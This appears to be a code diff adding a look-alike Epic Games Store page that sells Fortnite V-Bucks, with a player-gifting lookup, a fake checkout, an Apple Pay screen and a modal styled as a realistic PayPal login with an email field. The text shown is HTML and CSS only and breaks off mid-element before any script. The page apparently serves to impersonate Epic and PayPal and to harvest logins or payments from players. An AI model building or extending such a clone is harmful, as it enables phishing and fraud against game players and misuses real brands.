@@ -1,0 +1,1079 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Epic Games Store – V-Bucks</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --bg:#121212;
+  --bg2:#1a1a1a;
+  --bg3:#242424;
+  --bg4:#2a2a2a;
+  --border:#2e2e2e;
+  --text:#fff;
+  --muted:#a0a0a0;
+  --muted2:#666;
+  --cyan:#00c3ff;
+  --cyan2:#0092cc;
+  --yellow:#f5e642;
+}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;}
+
+/* NAV */
+nav{
+  background:#0e0e0e;
+  border-bottom:1px solid var(--border);
+  height:56px;
+  display:flex;align-items:center;
+  padding:0 32px;gap:24px;
+  position:sticky;top:0;z-index:100;
+}
+.epic-logo{display:flex;align-items:center;gap:10px;cursor:pointer;}
+.epic-shield{
+  width:32px;height:36px;
+  background:#fff;
+  clip-path:polygon(50% 0%,100% 15%,100% 60%,50% 100%,0% 60%,0% 15%);
+  display:flex;align-items:center;justify-content:center;
+}
+.epic-shield svg{width:18px;height:18px;}
+.epic-store-text{font-size:15px;font-weight:800;letter-spacing:.5px;color:#fff;}
+.nav-sep{width:1px;height:24px;background:var(--border);}
+.nav-links{display:flex;gap:28px;}
+.nav-links a{font-size:13px;font-weight:500;color:var(--muted);text-decoration:none;cursor:pointer;transition:color.15s;}
+.nav-links a:hover{color:#fff;}
+.nav-search-wrap{flex:1;max-width:280px;}
+.nav-search{
+  width:100%;height:36px;
+  background:var(--bg3);border:1px solid var(--border);border-radius:999px;
+  padding:0 14px 0 36px;font-size:13px;color:#fff;
+  font-family:'Inter',sans-serif;outline:none;
+  position:relative;
+}
+.nav-search-wrap{position:relative;}
+.nav-search-wrap svg{position:absolute;left:12px;top:50%;transform:translateY(-50%);opacity:.4;z-index:1;pointer-events:none;}
+.nav-right{margin-left:auto;display:flex;align-items:center;gap:12px;}
+.nav-avatar{width:32px;height:32px;border-radius:50%;overflow:hidden;background:#333;}
+.nav-avatar img{width:100%;height:100%;object-fit:cover;}
+
+/* PAGE */
+.page{max-width:1200px;margin:0 auto;padding:32px 32px 80px;}
+
+/* BREADCRUMB */
+.breadcrumb{display:flex;gap:6px;align-items:center;font-size:12px;color:var(--muted2);margin-bottom:20px;}
+.breadcrumb a{color:var(--muted);text-decoration:none;cursor:pointer;}
+.breadcrumb a:hover{color:#fff;}
+.breadcrumb span{opacity:.4;}
+
+/* PRODUCT TITLE */
+.product-title{font-size:32px;font-weight:900;margin-bottom:6px;letter-spacing:-.5px;}
+.product-tabs{display:flex;gap:24px;margin-bottom:28px;border-bottom:1px solid var(--border);padding-bottom:0;}
+.product-tab{font-size:13px;font-weight:600;color:var(--muted);padding-bottom:14px;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-1px;transition:color.15s;}
+.product-tab.active{color:#fff;border-color:#fff;}
+
+/* LAYOUT */
+.product-layout{display:grid;grid-template-columns:1fr 380px;gap:32px;align-items:start;}
+
+/* LEFT */
+.product-left{}
+.hero-banner{
+  width:100%;border-radius:8px;overflow:hidden;
+  background:linear-gradient(135deg,#1a6fd4,#003a8c);
+  aspect-ratio:16/9;
+  position:relative;
+  margin-bottom:24px;
+  display:flex;align-items:center;justify-content:center;
+}
+.hero-fn-logo{
+  position:absolute;top:16px;left:50%;transform:translateX(-50%);
+  z-index:2;
+  pointer-events:none;
+  white-space:nowrap;
+}
+.hero-fn-logo img{
+  width:220px;
+  opacity:.95;
+  filter:drop-shadow(0 2px 12px rgba(0,0,0,.7));
+  object-fit:contain;
+}
+.hero-coins{
+  width:72%;max-width:500px;
+  position:relative;z-index:1;
+  margin-top:48px;
+  filter:drop-shadow(0 20px 40px rgba(0,0,0,.6));
+}
+
+/* PACK SELECTOR */
+.pack-selector-title{font-size:13px;font-weight:700;color:var(--muted);letter-spacing:1px;text-transform:uppercase;margin-bottom:14px;}
+.packs-row{display:flex;flex-direction:column;gap:8px;margin-bottom:28px;}
+.pack-item{
+  display:flex;align-items:center;gap:16px;
+  background:var(--bg2);border:1.5px solid var(--border);
+  border-radius:8px;padding:14px 18px;
+  cursor:pointer;transition:border-color.15s,background.15s;
+}
+.pack-item:hover{border-color:#444;background:var(--bg3);}
+.pack-item.active{border-color:var(--cyan);background:rgba(0,195,255,.05);}
+.pack-thumb{width:72px;height:48px;border-radius:6px;overflow:hidden;flex-shrink:0;display:flex;align-items:center;justify-content:center;}
+.pack-thumb img{width:100%;height:100%;object-fit:cover;}
+.pack-thumb.c-blue  {background:linear-gradient(135deg,#1a6fd4,#003a8c);}
+.pack-thumb.c-green {background:linear-gradient(135deg,#1db954,#0a6e30);}
+.pack-thumb.c-lblue {background:linear-gradient(135deg,#00b4ff,#005c99);}
+.pack-thumb.c-purple{background:linear-gradient(135deg,#9b27af,#4a0870);}
+.pack-thumb.c-orange{background:linear-gradient(135deg,#ff6b1a,#b83000);}
+.pack-info{flex:1;}
+.pack-name{font-size:15px;font-weight:800;}
+.pack-sub{font-size:12px;color:var(--muted);margin-top:2px;}
+.pack-extra{
+  font-size:11px;font-weight:700;
+  background:rgba(0,195,255,.15);color:var(--cyan);
+  border-radius:4px;padding:2px 8px;margin-left:8px;
+}
+.pack-price-tag{font-size:16px;font-weight:800;color:#fff;white-space:nowrap;}
+.pack-radio{
+  width:18px;height:18px;border-radius:50%;
+  border:2px solid var(--border);flex-shrink:0;
+  display:flex;align-items:center;justify-content:center;
+  transition:border-color.15s;
+}
+.pack-item.active .pack-radio{border-color:var(--cyan);}
+.pack-radio-dot{width:9px;height:9px;border-radius:50%;background:var(--cyan);display:none;}
+.pack-item.active .pack-radio-dot{display:block;}
+
+/* DESCRIPTION */
+.product-desc{font-size:14px;color:var(--muted);line-height:1.7;margin-bottom:20px;}
+.product-desc strong{color:#fff;}
+
+/* RIGHT SIDEBAR */
+.product-sidebar{position:sticky;top:72px;}
+.sidebar-thumb{
+  width:100%;border-radius:8px;overflow:hidden;
+  background:linear-gradient(135deg,#1a6fd4,#003a8c);
+  aspect-ratio:16/9;
+  display:flex;align-items:center;justify-content:center;
+  position:relative;margin-bottom:16px;
+}
+.sidebar-fn-text{
+  position:absolute;top:8px;left:50%;transform:translateX(-50%);
+  z-index:2;
+  pointer-events:none;
+  white-space:nowrap;
+}
+.sidebar-fn-text img{
+  width:110px;
+  opacity:.95;
+  object-fit:contain;
+  filter:drop-shadow(0 2px 8px rgba(0,0,0,.7));
+}
+.sidebar-coins{width:65%;filter:drop-shadow(0 8px 16px rgba(0,0,0,.5));position:relative;z-index:1;margin-top:28px;}
+
+.esrb-box{
+  display:flex;align-items:flex-start;gap:14px;
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:8px;padding:14px 16px;margin-bottom:16px;
+}
+.esrb-badge{
+  background:#fff;color:#000;
+  font-size:9px;font-weight:900;
+  width:40px;height:46px;border-radius:4px;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  flex-shrink:0;
+  border:2px solid #000;
+}
+.esrb-t{font-size:22px;font-weight:900;line-height:1;}
+.esrb-label{font-size:7px;font-weight:900;letter-spacing:.5px;}
+.esrb-info .esrb-rating{font-size:14px;font-weight:700;margin-bottom:4px;}
+.esrb-info .esrb-desc{font-size:12px;color:var(--muted);line-height:1.5;}
+
+.addon-tag{
+  display:inline-block;
+  background:var(--bg3);border:1px solid var(--border);
+  border-radius:4px;padding:4px 12px;
+  font-size:12px;font-weight:600;color:var(--muted);
+  margin-bottom:14px;
+}
+
+/* USER SEARCH */
+.sidebar-search-label{font-size:11px;font-weight:700;color:var(--muted);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;}
+.sidebar-search-row{display:flex;gap:8px;margin-bottom:10px;}
+.sidebar-input{
+  flex:1;height:40px;
+  background:var(--bg3);border:1px solid var(--border);border-radius:6px;
+  padding:0 12px;font-size:13px;font-family:'Inter',sans-serif;
+  color:#fff;outline:none;transition:border.15s;
+}
+.sidebar-input:focus{border-color:var(--cyan);}
+.sidebar-input::placeholder{color:var(--muted2);}
+.sidebar-search-btn{
+  height:40px;padding:0 14px;
+  background:var(--bg3);border:1px solid var(--border);border-radius:6px;
+  color:#fff;font-size:12px;font-weight:700;font-family:'Inter',sans-serif;
+  cursor:pointer;transition:background.15s,border-color.15s;white-space:nowrap;
+  display:flex;align-items:center;gap:6px;
+}
+.sidebar-search-btn:hover{background:var(--bg4);border-color:#555;}
+.spin{display:none;width:13px;height:13px;border:2px solid rgba(255,255,255,.2);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;}
+.loading .sbtn-icon{display:none;}.loading .spin{display:block;}
+@keyframes spin{to{transform:rotate(360deg);}}
+
+.user-found-box{
+  display:none;
+  background:var(--bg3);border:1px solid rgba(0,195,255,.2);border-radius:6px;
+  padding:10px 12px;align-items:center;gap:10px;margin-bottom:12px;
+}
+.user-found-box.show{display:flex;}
+.uf-avatar{width:36px;height:36px;border-radius:50%;overflow:hidden;border:1.5px solid var(--cyan);flex-shrink:0;}
+.uf-avatar img{width:100%;height:100%;object-fit:cover;}
+.uf-name{font-size:13px;font-weight:800;}
+.uf-meta{font-size:11px;color:var(--muted);}
+
+.error-msg{display:none;font-size:12px;color:#ff6b6b;margin-bottom:10px;background:rgba(255,107,107,.08);border:1px solid rgba(255,107,107,.2);border-radius:6px;padding:8px 12px;}
+
+/* PRICE + BUTTONS */
+.sidebar-price{font-size:22px;font-weight:900;margin-bottom:14px;}
+
+.buy-btn{
+  width:100%;height:48px;
+  background:var(--cyan);
+  border:none;border-radius:6px;
+  color:#000;font-size:15px;font-weight:800;
+  font-family:'Inter',sans-serif;cursor:pointer;
+  transition:background.15s,transform.1s;
+  margin-bottom:10px;
+}
+.buy-btn:hover{background:#00d4ff;transform:translateY(-1px);}
+.buy-btn:disabled{background:#333;color:#666;cursor:not-allowed;transform:none;}
+
+.wishlist-btn{
+  width:100%;height:44px;
+  background:var(--bg3);border:1px solid var(--border);border-radius:6px;
+  color:#fff;font-size:14px;font-weight:700;
+  font-family:'Inter',sans-serif;cursor:pointer;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  transition:background.15s;
+}
+.wishlist-btn:hover{background:var(--bg4);}
+
+.sidebar-divider{border:none;border-top:1px solid var(--border);margin:16px 0;}
+
+/* PAYPAL MODAL */
+.pp-overlay{display:none;position:fixed;inset:0;z-index:2000;background:rgba(0,0,0,.75);align-items:center;justify-content:center;backdrop-filter:blur(4px);}
+.pp-overlay.show{display:flex;}
+.pp-modal{width:440px;max-width:calc(100vw - 32px);background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,.5);animation:modalIn .25s cubic-bezier(.34,1.56,.64,1);font-family:'Inter',sans-serif;}
+@keyframes modalIn{from{opacity:0;transform:scale(.92) translateY(12px);}to{opacity:1;transform:none;}}
+.pp-state{display:none;flex-direction:column;}
+.pp-state.active{display:flex;}
+
+/* PP2 - realistic PayPal styles */
+
+.pp2-header{background:#fff;padding:20px 24px 16px;display:flex;align-items:center;justify-content:center;border-bottom:1px solid #f0f0f0;position:relative;}
+.pp2-login-title{font-size:22px;font-weight:800;color:#111;text-align:center;margin-bottom:8px;}
+.pp2-login-sub{font-size:14px;color:#555;text-align:center;margin-bottom:24px;line-height:1.5;}
+.pp2-email-wrap{margin-bottom:10px;}
+.pp2-email-input{
+  width:100%;height:52px;
+  border:1.5px solid #b0c4de;border-radius:6px;
+  padding:0 16px;font-size:15px;font-family:'Inter',sans-serif;
+  color:#111;outline:none;background:#fff;
+  transition:border .15s;
+}
+.pp2-email-input:focus{border-color:#0070ba;}
+.pp2-forgot{font-size:13px;color:#0070ba;font-weight:600;margin-bottom:20px;cursor:pointer;}
+.pp2-forgot:hover{text-decoration:underline;}
+.pp2-next-btn{
+  width:100%;height:50px;
+  background:#0070ba;border:none;border-radius:999px;
+  color:#fff;font-size:16px;font-weight:700;
+  font-family:'Inter',sans-serif;cursor:pointer;
+  margin-bottom:16px;transition:background .15s;
+}
+.pp2-next-btn:hover{background:#005fa3;}
+.pp2-or{text-align:center;position:relative;margin-bottom:16px;display:flex;align-items:center;gap:10px;}
+.pp2-or::before,.pp2-or::after{content:'';flex:1;height:1px;background:#e0e0e0;}
+.pp2-or span{font-size:13px;color:#888;white-space:nowrap;}
+.pp2-create-btn{
+  width:100%;height:50px;
+  background:#fff;border:1.5px solid #333;border-radius:999px;
+  color:#111;font-size:15px;font-weight:700;
+  font-family:'Inter',sans-serif;cursor:pointer;
+  transition:background .15s;
+}
+.pp2-create-btn:hover{background:#f5f5f5;}
+
+.pp2-close{width:28px;height:28px;border:none;background:#f5f5f5;border-radius:50%;font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#666;}
+.pp2-close:hover{background:#e5e5e5;}
+.pp2-body{padding:24px;background:#fff;}
+.pp2-user-row{display:flex;align-items:center;gap:12px;background:#f7f9fc;border-radius:10px;padding:14px 16px;margin-bottom:20px;border:1px solid #e8edf5;}
+.pp2-user-avatar{width:40px;height:40px;border-radius:50%;background:#003087;color:#fff;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:800;flex-shrink:0;overflow:hidden;}
+.pp2-user-avatar img{width:100%;height:100%;object-fit:cover;}
+.pp2-user-name{font-size:14px;font-weight:700;color:#111;}
+.pp2-user-email{font-size:12px;color:#888;margin-top:2px;}
+.pp2-amount-box{text-align:center;margin-bottom:24px;padding-bottom:24px;border-bottom:1px solid #f0f0f0;}
+.pp2-amount-label{font-size:12px;font-weight:600;color:#888;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px;}
+.pp2-amount{font-size:40px;font-weight:800;color:#111;letter-spacing:-1px;}
+.pp2-amount-sub{font-size:13px;color:#888;margin-top:4px;}
+.pp2-processing-row{display:flex;align-items:center;gap:12px;background:#f0f8ff;border-radius:8px;padding:12px 16px;margin-bottom:12px;border:1px solid #c8e6f5;}
+.pp2-spinner{width:20px;height:20px;border:2.5px solid #c8e6f5;border-top-color:#009cde;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0;}
+.pp2-processing-row span{font-size:13px;font-weight:600;color:#0070ba;}
+.pp2-progress-wrap{width:100%;height:3px;background:#e8f4fc;border-radius:2px;margin-bottom:12px;overflow:hidden;}
+.pp2-progress-bar{height:100%;background:linear-gradient(90deg,#009cde,#003087);border-radius:2px;width:0%;transition:width .1s linear;}
+.pp2-note{font-size:12px;color:#aaa;text-align:center;line-height:1.5;}
+.pp2-footer{background:#f7f9fc;border-top:1px solid #eaedf5;padding:12px 24px;display:flex;align-items:center;justify-content:center;gap:8px;font-size:11px;color:#aaa;}
+
+/* PP Success */
+.pp2-success-icon{width:64px;height:64px;background:#0070ba;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;animation:popIn .4s cubic-bezier(.34,1.56,.64,1);}
+@keyframes popIn{from{transform:scale(0);opacity:0;}to{transform:scale(1);opacity:1;}}
+.pp2-success-title{font-size:13px;font-weight:700;color:#888;text-align:center;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px;}
+.pp2-success-amount{font-size:38px;font-weight:900;color:#111;text-align:center;letter-spacing:-1px;margin-bottom:20px;}
+.pp2-receipt-card{background:#f7f9fc;border:1px solid #e8edf5;border-radius:10px;padding:16px;margin-bottom:20px;}
+.pp2-receipt-header{font-size:11px;font-weight:700;color:#888;text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;}
+.pp2-receipt-row{display:flex;justify-content:space-between;font-size:13px;padding:5px 0;color:#444;}
+.pp2-receipt-row span:first-child{color:#888;}
+.pp2-receipt-row span:last-child{font-weight:600;color:#111;}
+.pp2-receipt-divider{border-top:1px solid #e8edf5;margin:10px 0;}
+.pp2-receipt-total{font-size:15px;}
+.pp2-receipt-total span:first-child{font-weight:700;color:#111;}
+.pp2-receipt-total span:last-child{font-size:17px;font-weight:900;color:#111;}
+.pp2-okay-btn{width:100%;height:50px;background:#0070ba;border:none;border-radius:8px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;margin-bottom:10px;transition:background .15s;}
+.pp2-okay-btn:hover{background:#005fa3;}
+.pp2-report{text-align:center;font-size:12px;color:#0070ba;cursor:pointer;text-decoration:underline;}
+
+@media(max-width:900px){
+  .product-layout{grid-template-columns:1fr;}
+  .product-sidebar{position:static;}
+  .packs-row{display:grid;grid-template-columns:1fr 1fr;}
+  .page{padding:20px 16px 60px;}
+}
+
+/* ═══ CHECKOUT MODAL ═══ */
+.ck-overlay{display:none;position:fixed;inset:0;z-index:2000;background:rgba(0,0,0,.8);align-items:center;justify-content:center;backdrop-filter:blur(4px);}
+.ck-overlay.show{display:flex;}
+.ck-modal{
+  display:flex;width:860px;max-width:calc(100vw - 24px);max-height:calc(100vh - 40px);
+  background:#1a1a1a;border-radius:8px;overflow:hidden;overflow-y:auto;
+  box-shadow:0 30px 80px rgba(0,0,0,.6);
+  position:relative;
+  animation:modalIn .25s cubic-bezier(.34,1.56,.64,1);
+}
+.ck-x{position:absolute;top:16px;right:16px;width:32px;height:32px;background:transparent;border:none;color:#888;font-size:20px;cursor:pointer;z-index:10;display:flex;align-items:center;justify-content:center;border-radius:4px;}
+.ck-x:hover{color:#fff;background:#333;}
+
+/* LEFT */
+.ck-left{flex:0 0 300px;padding:32px 28px;border-right:1px solid #2e2e2e;background:#141414;}
+.ck-header-row{display:flex;align-items:center;gap:12px;margin-bottom:28px;}
+.ck-title{font-size:20px;font-weight:800;}
+.ck-product-row{display:flex;align-items:center;gap:14px;margin-bottom:20px;}
+.ck-product-thumb{
+  width:80px;height:60px;border-radius:6px;flex-shrink:0;
+  background:linear-gradient(135deg,#ff6b1a,#b83000);
+  position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;
+}
+.ck-thumb-fn{position:absolute;top:4px;left:50%;transform:translateX(-50%);font-size:7px;font-weight:900;color:#fff;letter-spacing:1px;font-style:italic;white-space:nowrap;opacity:.9;}
+.ck-product-thumb img{width:90%;object-fit:contain;position:relative;z-index:1;}
+.ck-product-name{font-size:15px;font-weight:700;}
+.ck-divider{border:none;border-top:1px solid #2e2e2e;margin:12px 0;}
+.ck-row{display:flex;justify-content:space-between;font-size:13px;padding:3px 0;}
+.ck-lbl{color:#888;}.ck-val{font-weight:600;}
+.ck-total-row{padding-top:8px;}
+.ck-total-lbl{font-size:15px;font-weight:800;}
+.ck-total-val{font-size:18px;font-weight:900;color:#fff;}
+.ck-rewards-pill{
+  margin-top:16px;background:rgba(29,185,84,.1);border:1px solid rgba(29,185,84,.2);
+  border-radius:6px;padding:10px 12px;display:flex;align-items:center;gap:8px;
+  font-size:12px;color:#ccc;
+}
+.ck-rewards-pill strong{color:#1db954;}
+
+/* RIGHT */
+.ck-right{flex:1;padding:32px 28px;}
+.ck-user-row{display:flex;align-items:center;gap:10px;margin-bottom:24px;}
+.ck-user-avatar{width:32px;height:32px;border-radius:50%;background:#444;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;overflow:hidden;flex-shrink:0;}
+.ck-user-avatar img{width:100%;height:100%;object-fit:cover;}
+.ck-user-name{font-size:14px;font-weight:600;color:#ccc;}
+.ck-payment-title{font-size:18px;font-weight:800;margin-bottom:16px;}
+
+.ck-accordions{border:1px solid #2e2e2e;border-radius:8px;margin-bottom:12px;overflow:hidden;}
+.ck-accordion{border-bottom:1px solid #2e2e2e;}.ck-accordion:last-child{border-bottom:none;}
+.ck-accordion-row{display:flex;align-items:center;gap:12px;padding:14px 16px;cursor:pointer;}
+.ck-accordion-row:hover{background:#242424;}
+.ck-accordion-row span{flex:1;font-size:14px;font-weight:600;}
+.ck-acc-icon{width:32px;height:32px;border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.ck-chevron{color:#888;}
+
+.ck-methods{border:1px solid #2e2e2e;border-radius:8px;overflow:hidden;margin-bottom:16px;}
+.ck-method{display:flex;align-items:center;gap:12px;padding:14px 16px;cursor:pointer;border-bottom:1px solid #2e2e2e;transition:background .15s;}
+.ck-method:last-of-type{border-bottom:none;}
+.ck-method:hover{background:#242424;}
+.ck-method-icon{width:32px;height:28px;border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.ck-method span{flex:1;font-size:14px;font-weight:600;}
+.ck-radio{width:20px;height:20px;border-radius:50%;border:2px solid #555;flex-shrink:0;}
+.ck-radio-active{border-color:var(--cyan);background:radial-gradient(circle,var(--cyan) 0%,var(--cyan) 40%,transparent 41%);}
+.ck-all-methods{display:flex;align-items:center;gap:6px;padding:12px 16px;font-size:13px;font-weight:600;color:#888;cursor:pointer;border-top:1px solid #2e2e2e;}
+.ck-all-methods:hover{color:#ccc;}
+
+.ck-save-row{display:flex;align-items:flex-start;gap:12px;margin-bottom:20px;}
+.ck-toggle{width:40px;height:22px;background:#444;border-radius:999px;cursor:pointer;position:relative;flex-shrink:0;margin-top:2px;transition:background .2s;}
+.ck-toggle.on{background:var(--cyan);}
+.ck-toggle-knob{width:18px;height:18px;background:#fff;border-radius:50%;position:absolute;top:2px;left:2px;transition:left .2s;box-shadow:0 1px 4px rgba(0,0,0,.3);}
+.ck-toggle.on .ck-toggle-knob{left:20px;}
+.ck-save-title{font-size:13px;font-weight:700;margin-bottom:4px;}
+.ck-save-sub{font-size:12px;color:#666;line-height:1.5;}
+
+.ck-buy-btn{
+  width:100%;height:52px;
+  background:#ffc439;border:none;border-radius:6px;
+  font-size:18px;font-weight:900;font-family:'Inter',sans-serif;
+  color:#003087;cursor:pointer;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  margin-bottom:14px;transition:background .15s;
+}
+.ck-buy-btn:hover{background:#f0b429;}
+.ck-buy-btn.apple-style{background:#000;color:#fff;font-size:16px;}
+.ck-buy-btn.card-style{background:#0070ba;color:#fff;font-size:16px;}
+.ck-legal{font-size:11px;color:#555;line-height:1.6;}
+
+/* ═══ APPLE PAY MODAL ═══ */
+.ap-overlay{display:none;position:fixed;inset:0;z-index:3000;background:rgba(0,0,0,.85);align-items:center;justify-content:center;}
+.ap-overlay.show{display:flex;}
+.ap-modal{
+  width:400px;max-width:calc(100vw - 32px);
+  background:#2c2c2e;border-radius:20px;overflow:hidden;
+  padding:40px 32px 28px;text-align:center;
+  animation:modalIn .25s cubic-bezier(.34,1.56,.64,1);
+}
+.ap-scan-box{
+  width:220px;height:220px;background:#3a3a3c;border-radius:16px;
+  margin:0 auto 28px;position:relative;
+  display:flex;align-items:center;justify-content:center;
+}
+.ap-rings{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;}
+.ap-ring{
+  position:absolute;
+  width:var(--s);height:var(--s);
+  border-radius:50%;
+  border:10px dashed rgba(255,255,255,var(--op));
+  animation:spin-ring 4s linear infinite;
+  animation-delay:var(--d);
+}
+@keyframes spin-ring{to{transform:rotate(360deg);}}
+.ap-center{
+  width:64px;height:64px;background:#fff;border-radius:50%;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  z-index:2;box-shadow:0 4px 20px rgba(0,0,0,.3);
+}
+.ap-title{font-size:20px;font-weight:800;color:#fff;margin-bottom:10px;}
+.ap-sub{font-size:13px;color:#aaa;line-height:1.6;margin-bottom:24px;}
+.ap-footer-text{font-size:11px;color:#555;margin-top:24px;}
+
+/* success state for apple pay */
+.ap-success{display:none;flex-direction:column;align-items:center;}
+.ap-success.show{display:flex;}
+.ap-check{width:70px;height:70px;background:#e6f9ef;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:16px;animation:popIn .4s cubic-bezier(.34,1.56,.64,1);}
+.ap-success-amount{font-size:32px;font-weight:900;color:#fff;margin-bottom:6px;}
+.ap-success-sub{font-size:14px;color:#aaa;margin-bottom:20px;}
+.ap-okay{width:100%;height:46px;background:var(--cyan);border:none;border-radius:10px;color:#000;font-size:15px;font-weight:800;cursor:pointer;font-family:'Inter',sans-serif;}
+
+
+.pp2-login-title{font-size:22px;font-weight:800;color:#111;text-align:center;margin-bottom:8px;}
+.pp2-login-sub{font-size:14px;color:#555;text-align:center;margin-bottom:24px;line-height:1.5;}
+.pp2-email-wrap{margin-bottom:8px;}
+.pp2-email-input{
+  width:100%;height:52px;
+  border:1.5px solid #c8c8c8;border-radius:8px;
+  padding:0 16px;font-size:15px;font-family:'Inter',sans-serif;
+  color:#111;outline:none;transition:border .15s;background:#fff;
+}
+.pp2-email-input:focus{border-color:#0070ba;}
+.pp2-forgot{font-size:13px;color:#0070ba;font-weight:600;cursor:pointer;margin-bottom:20px;}
+.pp2-forgot:hover{text-decoration:underline;}
+.pp2-next-btn{
+  width:100%;height:50px;
+  background:#0070ba;border:none;border-radius:999px;
+  color:#fff;font-size:16px;font-weight:700;font-family:'Inter',sans-serif;
+  cursor:pointer;margin-bottom:18px;transition:background .15s;
+}
+.pp2-next-btn:hover{background:#005fa3;}
+.pp2-or{
+  display:flex;align-items:center;gap:10px;
+  font-size:13px;color:#aaa;margin-bottom:14px;
+}
+.pp2-or::before,.pp2-or::after{content:'';flex:1;height:1px;background:#e5e5e5;}
+.pp2-create-btn{
+  width:100%;height:50px;
+  background:#fff;border:1.5px solid #aaa;border-radius:999px;
+  color:#111;font-size:16px;font-weight:700;font-family:'Inter',sans-serif;
+  cursor:pointer;transition:border-color .15s;
+}
+.pp2-create-btn:hover{border-color:#555;}
+
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="epic-logo">
+    <img src="https://companieslogo.com/img/orig/epicgames.D-efd4e950.png?t=1720244494" alt="Epic Games" style="height:32px;object-fit:contain;filter:brightness(0) invert(1)">
+    <span class="epic-store-text">STORE</span>
+  </div>
+  <div class="nav-sep"></div>
+  <div class="nav-links">
+    <a>Support</a>
+    <a>Distribute ∨</a>
+  </div>
+  <div class="nav-search-wrap">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    <input class="nav-search" placeholder="Search store">
+  </div>
+  <div class="nav-links" style="margin-left:0">
+    <a>Discover</a>
+    <a>Browse</a>
+    <a>News</a>
+  </div>
+  <div class="nav-right">
+    <div class="nav-avatar"><img src="https://i.pravatar.cc/40?u=epic" alt=""></div>
+  </div>
+</nav>
+
+<div class="page">
+
+  <div class="breadcrumb">
+    <a>Epic Games Store</a><span>/</span>
+    <a>Fortnite</a><span>/</span>
+    <a>Add-Ons</a><span>/</span>
+    <span style="color:var(--muted)">V-Bucks</span>
+  </div>
+
+  <div class="product-title" id="productTitle">1,000 V-Bucks</div>
+  <div class="product-tabs">
+    <div class="product-tab active">Overview</div>
+    <div class="product-tab">Add-Ons</div>
+    <div class="product-tab">Experiences</div>
+    <div class="product-tab">FAQ</div>
+  </div>
+
+  <div class="product-layout">
+
+    <!-- LEFT -->
+    <div class="product-left">
+      <div class="hero-banner">
+        <div class="hero-fn-logo"><img src="https://wallpapers.com/images/hd/fortnite-game-logo-u043sf5gu4jik14x.png" alt="Fortnite"></div>
+        <img class="hero-coins" id="heroCoinImg" src="https://cms-assets.unrealengine.com/ARtnWWOBTeyImV0LDW3Plz/cmf2yerk51b7g07oi0x73yw1k" alt="V-Bucks">
+      </div>
+
+      <div class="pack-selector-title">Select Amount</div>
+      <div class="packs-row" id="packsRow"></div>
+
+      <p class="product-desc" id="productDesc">
+        Buy <strong id="descAmount">1,000</strong> Fortnite V-Bucks, the in-game currency that can be spent in Fortnite. You can purchase new customization items in the Shop for Fortnite Battle Royale, LEGO® Fortnite, Fortnite Festival or Rocket Racing, as well as additional content like this season's Battle Pass!
+      </p>
+    </div>
+
+    <!-- SIDEBAR -->
+    <div class="product-sidebar">
+      <div class="sidebar-thumb">
+        <div class="sidebar-fn-text"><img src="https://wallpapers.com/images/hd/fortnite-game-logo-u043sf5gu4jik14x.png" alt="Fortnite"></div>
+        <img class="sidebar-coins" id="sidebarCoinImg" src="https://cms-assets.unrealengine.com/ARtnWWOBTeyImV0LDW3Plz/cmf2yerk51b7g07oi0x73yw1k" alt="">
+      </div>
+
+      <div class="esrb-box">
+        <div class="esrb-badge"><div class="esrb-t">T</div><div class="esrb-label">ESRB</div></div>
+        <div class="esrb-info">
+          <div class="esrb-rating">Teen</div>
+          <div class="esrb-desc">Diverse Content: Discretion Advised<br>Users Interact, In-App Purchases</div>
+        </div>
+      </div>
+
+      <div class="addon-tag">Add-On</div>
+
+      <div class="sidebar-search-label">Gift to a player</div>
+      <div class="sidebar-search-row">
+        <input class="sidebar-input" id="usernameInput" type="text" placeholder="Epic username..." autocomplete="off">
+        <button class="sidebar-search-btn" id="searchBtn" onclick="searchUser()">
+          <svg class="sbtn-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+          <div class="spin"></div>
+          Find
+        </button>
+      </div>
+      <p class="error-msg" id="errorMsg"></p>
+      <div class="user-found-box" id="userFoundBox">
+        <div class="uf-avatar"><img id="userAvatar" src="" alt="" onerror="this.src='https://i.pravatar.cc/80?u=fn'"></div>
+        <div>
+          <div class="uf-name" id="userName"></div>
+          <div class="uf-meta" id="userMeta"></div>
+        </div>
+      </div>
+
+      <div class="sidebar-price" id="sidebarPrice">$8.99</div>
+
+      <button class="buy-btn" id="buyBtn" onclick="openCheckout()" disabled>Buy Now</button>
+      <button class="wishlist-btn">
